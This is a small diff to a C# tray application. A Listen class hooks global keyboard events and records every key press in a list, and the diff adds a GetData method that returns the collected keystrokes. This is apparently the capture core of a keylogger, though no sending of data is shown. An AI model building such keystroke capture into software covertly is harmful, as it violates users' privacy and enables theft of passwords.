@@ -30,6 +30,7 @@ namespace TrayApplication
            string insert = string.Format("KeyPress - {0}\n", e.KeyChar);
            _data.Add(insert);
         } 
+
         public Listen() 
         {
             _data = new List<string>();
@@ -38,6 +39,12 @@ namespace TrayApplication
             HookManager.KeyUp += HookManager_KeyUp;
             HookManager.KeyPress += HookManager_KeyPress;
         }
+
+        public List<string> GetData()
+        {
+            List<string> rRet = _data;
+            return rRet;
+        } 
         public void Dispose()
         {
             HookManager.KeyDown -= HookManager_KeyDown;
